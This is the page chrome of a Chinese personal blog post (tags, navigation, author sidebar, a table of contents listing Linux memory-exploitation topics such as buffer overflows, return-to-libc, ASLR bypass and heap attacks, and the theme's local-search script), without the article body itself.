          
            <a href="/tags/网络攻防/" rel="tag"># 网络攻防</a>
          
            <a href="/tags/Linux开发/" rel="tag"># Linux开发</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/07/20/ios间谍软件Pegasus/" rel="next" title="ios间谍软件Pegasus">
                <i class="fa fa-chevron-left"></i> ios间谍软件Pegasus
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/07/25/网易云音乐推荐系统/" rel="prev" title="网易云音乐推荐系统">
                网易云音乐推荐系统 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>


  </div>


          </div>
          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/touxiang.jpeg" alt="SZzzT">
            
              <p class="site-author-name" itemprop="name">SZzzT</p>
              <div class="site-description motion-element" itemprop="description">熬夜会长尸斑</div>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">7</span>
                    <span class="site-state-item-name">日志</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-categories">
                  
                    
                      <a href="/categories/">
                    
                  
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">10</span>
                    <span class="site-state-item-name">分类</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-tags">
                  
                    
                      <a href="/tags/">
                    
                  
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">14</span>
                    <span class="site-state-item-name">标签</span>
                  </a>
                </div>
              
            </nav>
          

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          

          
            <div class="links-of-author motion-element">
              
                <span class="links-of-author-item">
                  
                  
                    
                  
                  
                    
                  
                  <a href="https://github.com/szt19980425" title="GitHub &rarr; https://github.com/szt19980425" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
                </span>
              
                <span class="links-of-author-item">
                  
                  
                    
                  
                  
                    
                  
                  <a href="mailto:1446943251@qq.com" title="E-Mail &rarr; mailto:1446943251@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                </span>
              
                <span class="links-of-author-item">
                  
                  
                    
                  
                  
                    
                  
                  <a href="https://weibo.com/u/6493697261" title="Weibo &rarr; https://weibo.com/u/6493697261" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
                </span>
              
                <span class="links-of-author-item">
                  
                  
                    
                  
                  
                    
                  
                  <a href="https://user.qzone.qq.com/1446943251/infocenter" title="QQ &rarr; https://user.qzone.qq.com/1446943251/infocenter" rel="noopener" target="_blank"><i class="fa fa-fw fa-qq"></i>QQ</a>
                </span>
              
            </div>
          

          

          
          

          
        </div>
      </div>

      
      <!--noindex-->
        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
            
            
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#典型的基于堆栈的缓冲区溢出"><span class="nav-number">1.</span> <span class="nav-text">典型的基于堆栈的缓冲区溢出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#整数溢出"><span class="nav-number">2.</span> <span class="nav-text">整数溢出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Off-By-One-漏洞-基于栈"><span class="nav-number">3.</span> <span class="nav-text">Off-By-One 漏洞 (基于栈)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用return-to-libc绕过NX-bit"><span class="nav-number">4.</span> <span class="nav-text">使用return-to-libc绕过NX bit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用链接的return-to-libc绕过NX-bit"><span class="nav-number">5.</span> <span class="nav-text">使用链接的return-to-libc绕过NX bit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过ASLR-第一部分"><span class="nav-number">6.</span> <span class="nav-text">绕过ASLR - 第一部分</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过ASLR-第二部分"><span class="nav-number">7.</span> <span class="nav-text">绕过ASLR - 第二部分</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过ASLR-第三部分"><span class="nav-number">8.</span> <span class="nav-text">绕过ASLR - 第三部分</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用unlink堆溢出"><span class="nav-number">9.</span> <span class="nav-text">使用unlink堆溢出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用-Malloc-Maleficarum-的堆溢出"><span class="nav-number">10.</span> <span class="nav-text">使用 Malloc Maleficarum 的堆溢出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Off-By-One-漏洞（基于堆）"><span class="nav-number">11.</span> <span class="nav-text">Off-By-One 漏洞（基于堆）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#释放后使用"><span class="nav-number">12.</span> <span class="nav-text">释放后使用</span></a></li></ol></div>
            

          </div>
        </div>
      <!--/noindex-->
      

      

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2019</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">SZzzT</span>

  

  
</div>

<div class="powered-by">
<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
  本站访客数:<span id="busuanzi_value_site_uv"></span>
</span>
</div>


  <span class="post-meta-divider">|</span>



  <div class="theme-info">Git主页 – <a href="https://github.com/szt19980425" class="theme-link" rel="noopener" target="_blank">Git.SZzzT</a></div>





        








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
          <span id="scrollpercent"><span>0</span>%</span>
        
      </div>
    

    

    
  </div>

  

<script>
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>










  
  





  
    
    
  
  <script color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>









  
  <script src="/lib/jquery/index.js?v=3.4.1"></script>

  
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>




  <script src="/js/utils.js?v=7.2.0"></script>

  <script src="/js/motion.js?v=7.2.0"></script>



  
  


  <script src="/js/affix.js?v=7.2.0"></script>

  <script src="/js/schemes/pisces.js?v=7.2.0"></script>



  
  <script src="/js/scrollspy.js?v=7.2.0"></script>
<script src="/js/post-details.js?v=7.2.0"></script>



  <script src="/js/next-boot.js?v=7.2.0"></script>

  

  

  

  

  


  


  
  <script>
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  

  

  

  

  

  

  

  

  

  

  


  

</body>
</html>
